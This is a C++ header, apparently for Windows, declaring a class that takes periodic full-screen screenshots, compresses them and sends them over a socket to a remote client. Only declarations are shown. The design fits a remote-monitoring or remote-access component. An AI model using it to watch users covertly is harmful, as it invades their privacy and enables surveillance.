#pragma once

#include "utils.h"
#include <string>
#include <cstdio>
#include <string>
#include <windows.h>
#include <direct.h>
#include <thread>
#include <atomic>

class ScreenshotThread {
private:
    thread worker;
    atomic<bool> screenshot_running{ false };
	int interval;
    string folder_name = "";
    int server_socket;
    const int BUFFER_SIZE = 8192;
	char buffer[8192] = { 0 };

    // Function to save a bitmap to a file
    void saveBitmapToFile(HBITMAP hBitmap, const char* filename);

    // Function to capture a screenshot of the entire screen
	void capture(const char* filename);

    // Function to send a file to the client
	void sendSingleFile(const char* filename);

	// Function to take screenshot and save it to a file
	void captureAndSave();

	// Compress the folder containing the screenshots and send it to the client
	void compressAndSend();

	// Worker thread function
	void workerThread();

public:
	ScreenshotThread(int server_socket) : server_socket(server_socket) {}

	// Setter for interval
	void setInterval(int interval);

	void start(const string& type);

	void stop();

	~ScreenshotThread() {
		stop();
	}
};